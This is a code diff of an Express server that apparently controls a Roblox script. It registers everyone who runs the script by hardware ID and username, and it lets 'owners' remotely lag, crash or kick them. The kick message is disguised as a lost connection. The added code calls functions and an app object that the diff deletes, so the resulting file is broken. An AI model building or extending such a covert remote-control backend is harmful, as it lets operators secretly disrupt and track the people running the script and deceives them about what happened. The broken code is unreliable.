@@ -1,426 +1,334 @@
-const express = require('express');
-const cors = require('cors');
-const fs = require('fs');
-const path = require('path');
-const crypto = require('crypto');
-const jwt = require('jsonwebtoken');
-require('dotenv').config();
+// ===== OWNERS MANAGEMENT =====
 
-const app = express();
-app.use(cors());
-app.use(express.json());
-
-// ===== CORRECT PATH FOR FRONTEND =====
-const frontendPath = path.join(__dirname, '..', 'frontend');
-const SITE_PASSWORD = process.env.SITE_PASSWORD || 'default123';
-
-// Data file paths
-const USERS_FILE = path.join(__dirname, 'data', 'users.json');
-const SESSIONS_FILE = path.join(__dirname, 'data', 'sessions.json');
-
-// Initialize data files
-if (!fs.existsSync(path.join(__dirname, 'data'))) {
-    fs.mkdirSync(path.join(__dirname, 'data'));
-}
-
-if (!fs.existsSync(USERS_FILE)) {
-    fs.writeFileSync(USERS_FILE, JSON.stringify([]));
-}
-
-if (!fs.existsSync(SESSIONS_FILE)) {
-    fs.writeFileSync(SESSIONS_FILE, JSON.stringify([]));
-}
-
-// Helper functions
-const readUsers = () => {
-    try {
-        return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
-    } catch {
-        return [];
-    }
-};
-
-const writeUsers = (users) => {
-    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
-};
-
-const readSessions = () => {
-    try {
-        return JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
-    } catch {
-        return [];
-    }
-};
-
-const writeSessions = (sessions) => {
-    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
-};
-
-// Middleware to verify JWT
-const authenticateToken = (req, res, next) => {
-    const authHeader = req.headers['authorization'];
-    const token = authHeader && authHeader.split(' ')[1];
-
-    if (!token) {
-        return res.status(401).json({ error: 'Authentication required' });
-    }
-
-    jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
-        if (err) {
-            return res.status(403).json({ error: 'Invalid or expired token' });
-        }
-        req.user = user;
-        next();
-    });
-};
-
-// Middleware to check if user has entered site password
-const checkSitePassword = (req, res, next) => {
-    // Skip password check for API endpoints
-    if (req.path.startsWith('/api/')) {
-        return next();
+// Get all owners
+app.get('/api/owners', authenticateToken, (req, res) => {
+    if (!req.user.isOwner) {
+        return res.status(403).json({ error: 'Only owners can view owners list' });
     }
     
-    // Check if user has a valid site session
-    const sessionToken = req.headers['x-site-session'] || req.cookies?.siteSession;
-    
-    if (!sessionToken) {
-        // If trying to access the main page, show password form
-        if (req.path === '/' || req.path === '/index.html') {
-            return res.sendFile(path.join(frontendPath, 'gate.html'));
-        }
-        return res.status(401).send('Access Denied');
-    }
-    
-    // Verify session token
-    try {
-        const decoded = jwt.verify(sessionToken, process.env.JWT_SECRET);
-        if (decoded.type === 'site-access') {
-            return next();
-        }
-    } catch (err) {
-        // Invalid token
-        if (req.path === '/' || req.path === '/index.html') {
-            return res.sendFile(path.join(frontendPath, 'gate.html'));
-        }
-        return res.status(401).send('Access Denied');
-    }
-};
-
-// Apply password protection to ALL static files
-app.use(express.static(frontendPath));
-app.use(checkSitePassword);
-
-// ===== AUTH ENDPOINT FOR SITE PASSWORD =====
-app.post('/api/site-auth', (req, res) => {
-    const { password } = req.body;
-    
-    if (password === SITE_PASSWORD) {
-        // Generate site access token (short lived)
-        const token = jwt.sign(
-            { type: 'site-access', timestamp: Date.now() },
-            process.env.JWT_SECRET,
-            { expiresIn: '1h' }
-        );
-        
-        res.json({
-            success: true,
-            token: token
-        });
-    } else {
-        res.status(401).json({
-            success: false,
-            error: 'Invalid password'
-        });
-    }
-});
-
-// ===== API ENDPOINTS =====
-
-// 1. Register/Login script (HWID authentication)
-app.post('/api/auth', (req, res) => {
-    const { hwid, password } = req.body;
-
-    if (!hwid) {
-        return res.status(400).json({ error: 'HWID is required' });
-    }
-
-    let users = readUsers();
-    let user = users.find(u => u.hwid === hwid);
-
-    // If user doesn't exist, create new user
-    if (!user) {
-        // Check if this is an owner adding a new user
-        if (password && password === process.env.ADMIN_PASSWORD) {
-            const newUser = {
-                id: crypto.randomUUID(),
-                hwid: hwid,
-                username: req.body.username || `User_${hwid.slice(0, 8)}`,
-                isOwner: false,
-                createdAt: new Date().toISOString(),
-                settings: {
-                    lagPercentage: 50,
-                    crashEnabled: false,
-                    kickMessage: 'Your connection has been lost. Please try again later.'
-                }
-            };
-            users.push(newUser);
-            writeUsers(users);
-            user = newUser;
-        } else {
-            return res.status(401).json({ 
-                error: 'HWID not registered. Contact an owner to add you.' 
-            });
-        }
-    }
-
-    // Generate session token
-    const token = jwt.sign(
-        { 
-            id: user.id, 
-            hwid: user.hwid, 
-            isOwner: user.isOwner 
-        }, 
-        process.env.JWT_SECRET,
-        { expiresIn: '24h' }
-    );
-
-    // Save session
-    const sessions = readSessions();
-    sessions.push({
-        token,
-        hwid: user.hwid,
-        userId: user.id,
-        createdAt: new Date().toISOString(),
-        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString()
-    });
-    writeSessions(sessions);
-
-    res.json({
-        success: true,
-        token,
-        user: {
-            id: user.id,
-            hwid: user.hwid,
-            username: user.username,
-            isOwner: user.isOwner,
-            settings: user.settings
-        }
-    });
-});
-
-// 2. Get all active users (for website)
-app.get('/api/users', authenticateToken, (req, res) => {
     const users = readUsers();
+    const owners = users.filter(u => u.isOwner === true);
     const sessions = readSessions();
     
-    // Get active users (with valid sessions)
-    const activeUsers = users.map(user => {
+    const ownersWithStatus = owners.map(owner => {
         const activeSession = sessions.find(s => 
-            s.userId === user.id && 
+            s.userId === owner.id && 
             new Date(s.expiresAt) > new Date()
         );
-        
         return {
-            ...user,
-            isActive: !!activeSession,
-            sessionId: activeSession ? activeSession.token : null
+            ...owner,
+            isActive: !!activeSession
         };
     });
-
-    res.json(activeUsers);
+    
+    res.json(ownersWithStatus);
 });
 
-// 3. Update user settings (Lag, Crash, Kick)
-app.put('/api/users/:userId/settings', authenticateToken, (req, res) => {
-    const { userId } = req.params;
-    const { lagPercentage, crashEnabled, kickMessage } = req.body;
-
-    // Check if user is owner
+// Add owner by Roblox username
+app.post('/api/owners/add', authenticateToken, (req, res) => {
     if (!req.user.isOwner) {
-        return res.status(403).json({ error: 'Only owners can modify settings' });
+        return res.status(403).json({ error: 'Only owners can add other owners' });
     }
-
-    let users = readUsers();
-    const userIndex = users.findIndex(u => u.id === userId);
-
-    if (userIndex === -1) {
-        return res.status(404).json({ error: 'User not found' });
+    
+    const { username } = req.body;
+    
+    if (!username) {
+        return res.status(400).json({ error: 'Roblox username is required' });
     }
-
-    // Update settings
-    if (lagPercentage !== undefined) {
-        users[userIndex].settings.lagPercentage = Math.min(100, Math.max(0, lagPercentage));
-    }
-    if (crashEnabled !== undefined) {
-        users[userIndex].settings.crashEnabled = crashEnabled;
-    }
-    if (kickMessage !== undefined) {
-        users[userIndex].settings.kickMessage = kickMessage;
-    }
-
-    writeUsers(users);
-
-    res.json({
-        success: true,
-        settings: users[userIndex].settings
-    });
-});
-
-// 4. Trigger crash for specific user
-app.post('/api/users/:userId/crash', authenticateToken, (req, res) => {
-    const { userId } = req.params;
-
-    if (!req.user.isOwner) {
-        return res.status(403).json({ error: 'Only owners can trigger crashes' });
-    }
-
-    const users = readUsers();
-    const user = users.find(u => u.id === userId);
-
-    if (!user) {
-        return res.status(404).json({ error: 'User not found' });
-    }
-
-    // Enable crash for this user
-    user.settings.crashEnabled = true;
-    writeUsers(users);
-
-    // Log crash event
-    console.log(`[CRASH] User ${user.username} (${user.hwid}) crashed by ${req.user.id}`);
-
-    res.json({
-        success: true,
-        message: `Crash triggered for ${user.username}`,
-        user: user
-    });
-});
-
-// 5. Kick user with custom message
-app.post('/api/users/:userId/kick', authenticateToken, (req, res) => {
-    const { userId } = req.params;
-    const { message } = req.body;
-
-    if (!req.user.isOwner) {
-        return res.status(403).json({ error: 'Only owners can kick users' });
-    }
-
-    let users = readUsers();
-    const userIndex = users.findIndex(u => u.id === userId);
-
-    if (userIndex === -1) {
-        return res.status(404).json({ error: 'User not found' });
-    }
-
-    // Update kick message
-    if (message) {
-        users[userIndex].settings.kickMessage = message;
-    }
-
-    // Force session expiration
-    const sessions = readSessions();
-    const updatedSessions = sessions.filter(s => s.userId !== userId);
-    writeSessions(updatedSessions);
-
-    writeUsers(users);
-
-    res.json({
-        success: true,
-        message: `User ${users[userIndex].username} kicked`,
-        kickMessage: users[userIndex].settings.kickMessage
-    });
-});
-
-// 6. Add new user (Owner only)
-app.post('/api/users/add', authenticateToken, (req, res) => {
-    const { hwid, username } = req.body;
-
-    if (!req.user.isOwner) {
-        return res.status(403).json({ error: 'Only owners can add users' });
-    }
-
-    if (!hwid) {
-        return res.status(400).json({ error: 'HWID is required' });
-    }
-
+    
     let users = readUsers();
     
-    // Check if user already exists
-    if (users.find(u => u.hwid === hwid)) {
-        return res.status(400).json({ error: 'User with this HWID already exists' });
+    // Check if already exists
+    const existing = users.find(u => u.username.toLowerCase() === username.toLowerCase());
+    if (existing) {
+        return res.status(400).json({ error: 'User already registered' });
     }
-
-    const newUser = {
+    
+    // Create new owner with a placeholder HWID
+    // The actual HWID will be set when they first execute the script
+    const newOwner = {
         id: crypto.randomUUID(),
-        hwid: hwid,
-        username: username || `User_${hwid.slice(0, 8)}`,
-        isOwner: false,
+        hwid: `pending_${username}`,
+        username: username,
+        isOwner: true,
         createdAt: new Date().toISOString(),
         settings: {
-            lagPercentage: 50,
+            lagPercentage: 0,
             crashEnabled: false,
             kickMessage: 'Your connection has been lost. Please try again later.'
         }
     };
-
-    users.push(newUser);
+    
+    users.push(newOwner);
     writeUsers(users);
-
-    res.json({
-        success: true,
-        user: newUser
-    });
-});
-
-// 7. Remove user (Owner only)
-app.delete('/api/users/:userId', authenticateToken, (req, res) => {
-    const { userId } = req.params;
-
-    if (!req.user.isOwner) {
-        return res.status(403).json({ error: 'Only owners can remove users' });
-    }
-
-    let users = readUsers();
-    const userIndex = users.findIndex(u => u.id === userId);
-
-    if (userIndex === -1) {
-        return res.status(404).json({ error: 'User not found' });
-    }
-
-    // Remove user's sessions
-    const sessions = readSessions();
-    const updatedSessions = sessions.filter(s => s.userId !== userId);
-    writeSessions(updatedSessions);
-
-    // Remove user
-    users.splice(userIndex, 1);
-    writeUsers(users);
-
-    res.json({
-        success: true,
-        message: 'User removed successfully'
-    });
-});
-
-// 8. Get active sessions count
-app.get('/api/stats', authenticateToken, (req, res) => {
-    const sessions = readSessions();
-    const activeSessions = sessions.filter(s => new Date(s.expiresAt) > new Date());
     
     res.json({
-        totalUsers: readUsers().length,
-        activeUsers: activeSessions.length,
-        timestamp: new Date().toISOString()
+        success: true,
+        user: newOwner
     });
 });
 
-// Serve frontend
-app.get('/', (req, res) => {
-    res.sendFile(path.join(frontendPath, 'index.html'));
+// Remove owner
+app.delete('/api/owners/:ownerId', authenticateToken, (req, res) => {
+    if (!req.user.isOwner) {
+        return res.status(403).json({ error: 'Only owners can remove owners' });
+    }
+    
+    const { ownerId } = req.params;
+    let users = readUsers();
+    
+    const userIndex = users.findIndex(u => u.id === ownerId);
+    if (userIndex === -1) {
+        return res.status(404).json({ error: 'Owner not found' });
+    }
+    
+    // Prevent removing yourself
+    if (users[userIndex].id === req.user.id) {
+        return res.status(403).json({ error: 'Cannot remove yourself' });
+    }
+    
+    users.splice(userIndex, 1);
+    writeUsers(users);
+    
+    res.json({
+        success: true,
+        message: 'Owner removed successfully'
+    });
 });
 
-// Start server
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+// ===== SETTINGS MANAGEMENT =====
+
+// Save default kick message
+app.post('/api/settings/kick-message', authenticateToken, (req, res) => {
+    if (!req.user.isOwner) {
+        return res.status(403).json({ error: 'Only owners can change settings' });
+    }
+    
+    const { message } = req.body;
+    
+    if (!message) {
+        return res.status(400).json({ error: 'Message is required' });
+    }
+    
+    // Store in a settings file or memory
+    // For simplicity, we'll store in a settings.json file
+    const settingsPath = path.join(__dirname, 'data', 'settings.json');
+    let settings = {};
+    
+    if (fs.existsSync(settingsPath)) {
+        settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
+    }
+    
+    settings.defaultKickMessage = message;
+    fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2));
+    
+    res.json({
+        success: true,
+        message: 'Default kick message saved'
+    });
+});
+
+// Save default lag
+app.post('/api/settings/default-lag', authenticateToken, (req, res) => {
+    if (!req.user.isOwner) {
+        return res.status(403).json({ error: 'Only owners can change settings' });
+    }
+    
+    const { lagPercentage } = req.body;
+    
+    if (lagPercentage === undefined || lagPercentage < 0 || lagPercentage > 100) {
+        return res.status(400).json({ error: 'Invalid lag percentage (0-100)' });
+    }
+    
+    const settingsPath = path.join(__dirname, 'data', 'settings.json');
+    let settings = {};
+    
+    if (fs.existsSync(settingsPath)) {
+        settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
+    }
+    
+    settings.defaultLag = lagPercentage;
+    fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2));
+    
+    res.json({
+        success: true,
+        message: 'Default lag saved'
+    });
+});
+
+// Save session timeout
+app.post('/api/settings/session-timeout', authenticateToken, (req, res) => {
+    if (!req.user.isOwner) {
+        return res.status(403).json({ error: 'Only owners can change settings' });
+    }
+    
+    const { timeout } = req.body;
+    
+    if (!timeout || timeout < 1) {
+        return res.status(400).json({ error: 'Invalid timeout value' });
+    }
+    
+    const settingsPath = path.join(__dirname, 'data', 'settings.json');
+    let settings = {};
+    
+    if (fs.existsSync(settingsPath)) {
+        settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
+    }
+    
+    settings.sessionTimeout = timeout;
+    fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2));
+    
+    res.json({
+        success: true,
+        message: 'Session timeout saved'
+    });
+});
+
+// Get settings
+app.get('/api/settings', authenticateToken, (req, res) => {
+    const settingsPath = path.join(__dirname, 'data', 'settings.json');
+    let settings = {};
+    
+    if (fs.existsSync(settingsPath)) {
+        settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
+    }
+    
+    res.json({
+        defaultKickMessage: settings.defaultKickMessage || 'Your connection has been lost. Please try again later.',
+        defaultLag: settings.defaultLag || 50,
+        sessionTimeout: settings.sessionTimeout || 10
+    });
+});
+
+// ===== SCRIPT EXECUTION API =====
+
+// Register a user executing the script
+app.post('/api/script/register', (req, res) => {
+    const { hwid, robloxUsername } = req.body;
+    
+    if (!hwid) {
+        return res.status(400).json({ error: 'HWID is required' });
+    }
+    
+    let users = readUsers();
+    let user = users.find(u => u.hwid === hwid);
+    
+    // If user doesn't exist, create a regular user
+    if (!user) {
+        const newUser = {
+            id: crypto.randomUUID(),
+            hwid: hwid,
+            username: robloxUsername || `User_${hwid.slice(0, 8)}`,
+            isOwner: false,
+            createdAt: new Date().toISOString(),
+            settings: {
+                lagPercentage: 50,
+                crashEnabled: false,
+                kickMessage: 'Your connection has been lost. Please try again later.'
+            }
+        };
+        users.push(newUser);
+        writeUsers(users);
+        user = newUser;
+    }
+    
+    // Update username if provided and different
+    if (robloxUsername && user.username !== robloxUsername) {
+        user.username = robloxUsername;
+        writeUsers(users);
+    }
+    
+    // Create/update session
+    const sessions = readSessions();
+    const existingSession = sessions.find(s => s.userId === user.id);
+    
+    if (existingSession) {
+        // Update existing session
+        existingSession.expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();
+    } else {
+        sessions.push({
+            userId: user.id,
+            hwid: hwid,
+            createdAt: new Date().toISOString(),
+            expiresAt: new Date(Date.now() + 10 * 60 * 1000).toISOString()
+        });
+    }
+    writeSessions(sessions);
+    
+    // Get current settings
+    const settingsPath = path.join(__dirname, 'data', 'settings.json');
+    let settings = {};
+    if (fs.existsSync(settingsPath)) {
+        settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
+    }
+    
+    res.json({
+        success: true,
+        user: {
+            id: user.id,
+            username: user.username,
+            hwid: user.hwid,
+            isOwner: user.isOwner,
+            settings: {
+                lagPercentage: user.settings.lagPercentage || 50,
+                crashEnabled: user.settings.crashEnabled || false,
+                kickMessage: user.settings.kickMessage || settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
+            }
+        }
+    });
+});
+
+// Get script commands for a user
+app.get('/api/script/commands/:hwid', (req, res) => {
+    const { hwid } = req.params;
+    
+    let users = readUsers();
+    const user = users.find(u => u.hwid === hwid);
+    
+    if (!user) {
+        return res.status(404).json({ error: 'User not found' });
+    }
+    
+    // Get settings
+    const settingsPath = path.join(__dirname, 'data', 'settings.json');
+    let settings = {};
+    if (fs.existsSync(settingsPath)) {
+        settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
+    }
+    
+    res.json({
+        success: true,
+        commands: {
+            lagPercentage: user.settings.lagPercentage || settings.defaultLag || 50,
+            crashEnabled: user.settings.crashEnabled || false,
+            kickMessage: user.settings.kickMessage || settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
+        }
+    });
+});
+
+// Update user status (keep alive)
+app.post('/api/script/heartbeat', (req, res) => {
+    const { hwid } = req.body;
+    
+    if (!hwid) {
+        return res.status(400).json({ error: 'HWID is required' });
+    }
+    
+    let users = readUsers();
+    const user = users.find(u => u.hwid === hwid);
+    
+    if (!user) {
+        return res.status(404).json({ error: 'User not found' });
+    }
+    
+    // Update session
+    const sessions = readSessions();
+    const session = sessions.find(s => s.userId === user.id);
+    
+    if (session) {
+        session.expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();
+        writeSessions(sessions);
+    }
+    
+    res.json({ success: true });
 });
